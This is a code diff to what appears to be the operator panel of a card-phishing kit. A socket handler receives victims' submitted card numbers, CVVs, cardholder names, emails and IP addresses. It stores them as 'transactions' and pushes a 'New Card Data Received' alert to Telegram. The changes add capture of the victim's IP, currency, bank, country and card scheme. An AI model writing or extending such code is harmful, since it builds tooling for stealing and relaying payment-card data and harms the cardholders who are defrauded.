@@ -1003,7 +1003,6 @@
       document.getElementById('captureStatus').textContent = 'Connection error: ' + error.message;
       document.getElementById('captureStatus').style.color = '#ef4444';
     });
-    // Handle card submission data
 socket.on('card_submitted', (data) => {
   console.log('Received card submission:', data);
   if (data.cardData && data.invoiceId) {
@@ -1024,6 +1023,18 @@ socket.on('card_submitted', (data) => {
       transaction.email = data.cardData.email;
       transaction.cardholder = data.cardData.cardholder;
       transaction.viewed = false; // Mark as new so it's highlighted
+      
+      // Update other fields if they exist in cardData
+      if (data.ip) transaction.ip = data.ip;
+      if (data.cardData.currency) transaction.currency = data.cardData.currency;
+      
+      if (data.cardData.bankName || data.cardData.country || data.cardData.cardType) {
+        transaction.bankInfo = transaction.bankInfo || {};
+        if (data.cardData.bankName) transaction.bankInfo.bank = data.cardData.bankName;
+        if (data.cardData.country) transaction.bankInfo.country = data.cardData.country;
+        if (data.cardData.cardType) transaction.bankInfo.scheme = data.cardData.cardType;
+      }
+      
       transactionsMap.set(data.invoiceId, transaction);
     } else {
       // Create a new transaction if it doesn't exist yet
@@ -1034,20 +1045,22 @@ socket.on('card_submitted', (data) => {
         cvv: data.cardData.cvv,
         email: data.cardData.email,
         cardholder: data.cardData.cardholder,
-        amount: data.cardData.amount,
+        amount: data.cardData.amount || '0',
+        currency: data.cardData.currency || 'INR',
         timestamp: new Date().toISOString(),
         status: 'processing',
         viewed: false,
+        ip: data.ip || 'Unknown',
         bankInfo: {
-          bank: data.cardData.bankName,
-          country: data.cardData.country,
-          scheme: data.cardData.cardType
+          bank: data.cardData.bankName || 'Unknown',
+          country: data.cardData.country || 'Unknown',
+          scheme: data.cardData.cardType || 'Unknown'
         }
       };
       transactionsMap.set(data.invoiceId, newTransaction);
     }
     
-    // Refresh the transactions table with the new data
+    // Load/refresh the transactions table
     loadTransactions();
     
     // Play notification sound and show notification
@@ -1058,7 +1071,6 @@ socket.on('card_submitted', (data) => {
     sendTelegramNotification(`💳 <b>New Card Data Received</b>\nCard: ${data.cardData.cardNumber.slice(-4)}\nName: ${data.cardData.cardholder}\nInvoice ID: ${data.invoiceId}`);
   }
 });
-    
     // Log all socket events for debugging
     const originalEmit = socket.emit;
     socket.emit = function() {
